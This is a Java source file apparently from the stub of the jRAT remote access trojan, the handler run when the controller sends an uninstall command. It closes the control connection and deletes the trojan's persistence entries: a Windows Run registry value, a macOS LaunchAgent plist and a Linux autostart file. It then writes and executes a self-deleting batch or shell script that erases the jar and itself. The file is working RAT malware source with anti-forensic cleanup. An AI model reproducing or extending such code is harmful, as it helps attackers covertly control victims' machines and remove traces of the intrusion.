package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileWriter;
import java.util.Random;

import se.jrat.stub.Configuration;
import se.jrat.stub.Connection;
import se.jrat.stub.WinRegistry;
import se.jrat.stub.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

public class Packet36Uninstall extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File me = Utils.getJarFile();
		
		if (!me.isFile()) {
			return;
		}

		try {
			Connection.socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		try {
			String fileName = Integer.toString((new Random()).nextInt(10000));
			File file = null;
			String text = "";
			
			String home = System.getProperty("user.home");
			
			if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				home = "/System/";
			}

			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.name);

				file = new File(fileName + ".bat");

				text += "pause\n";
				text += "del \"" + me.getAbsolutePath() + "\"" + "\n";
				text += "del %0";
				text = text.replace("\n", " & ");

			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!bin/bash\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
				File startupFile = new File(home + "/.config/autostart/" + Configuration.name + ".desktop");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!bin/bash\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			}

			if (file != null && text.length() > 0) {
				FileWriter writer = new FileWriter(file);
				writer.write(text);
				writer.close();

				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
					Runtime.getRuntime().exec(new String[] { "sh", file.getName() });
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		System.exit(0);
	}

}
